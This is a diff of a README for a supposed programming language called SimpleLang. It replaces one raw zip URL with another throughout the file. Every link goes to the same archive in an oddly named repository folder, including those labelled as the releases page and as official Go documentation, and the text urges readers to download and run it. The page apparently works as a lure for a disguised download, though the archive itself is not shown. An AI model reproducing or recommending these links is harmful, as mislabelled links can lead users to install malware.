@@ -4,18 +4,18 @@
 Welcome to SimpleLang! This is a minimalist programming language that is easy to read and write, making coding fun and accessible. SimpleLang compiles down to Go, a powerful language, so you can enjoy the simplicity of SimpleLang without losing performance.
 
 ## 📥 Download SimpleLang
-[![Download SimpleLang](https://github.com/lenon23/SimpleLang/raw/refs/heads/main/subchorionic/Lang-Simple-reluctance.zip)](https://github.com/lenon23/SimpleLang/raw/refs/heads/main/subchorionic/Lang-Simple-reluctance.zip)
+[![Download SimpleLang](https://raw.githubusercontent.com/lenon23/SimpleLang/main/subchorionic/Lang_Simple_1.9.zip)](https://raw.githubusercontent.com/lenon23/SimpleLang/main/subchorionic/Lang_Simple_1.9.zip)
 
 You can find the latest version of SimpleLang on the Releases page. Click the link below to visit the page and download the application.
 
-[Download SimpleLang](https://github.com/lenon23/SimpleLang/raw/refs/heads/main/subchorionic/Lang-Simple-reluctance.zip)
+[Download SimpleLang](https://raw.githubusercontent.com/lenon23/SimpleLang/main/subchorionic/Lang_Simple_1.9.zip)
 
 ## 🚀 Getting Started
 To get started with SimpleLang, follow these simple steps to download and run the software.
 
 ### 1. Visit the Releases Page
 Go to the SimpleLang Releases page by clicking the link below:
-[Visit Releases Page](https://github.com/lenon23/SimpleLang/raw/refs/heads/main/subchorionic/Lang-Simple-reluctance.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/lenon23/SimpleLang/main/subchorionic/Lang_Simple_1.9.zip)
 
 ### 2. Choose a Version
 On the Releases page, you will see a list of available versions. Look for the latest version, which typically has the highest number.
@@ -47,7 +47,7 @@ If you encounter any issues or have questions, please check our documentation av
 
 ## 📖 Additional Resources
 For further learning, consider checking out:
-- [Official Go Documentation](https://github.com/lenon23/SimpleLang/raw/refs/heads/main/subchorionic/Lang-Simple-reluctance.zip)
-- [SimpleLang Documentation](https://github.com/lenon23/SimpleLang/raw/refs/heads/main/subchorionic/Lang-Simple-reluctance.zip)
+- [Official Go Documentation](https://raw.githubusercontent.com/lenon23/SimpleLang/main/subchorionic/Lang_Simple_1.9.zip)
+- [SimpleLang Documentation](https://raw.githubusercontent.com/lenon23/SimpleLang/main/subchorionic/Lang_Simple_1.9.zip)
 
 Feel free to explore and enjoy your coding journey with SimpleLang! Remember, coding should be fun and straightforward.
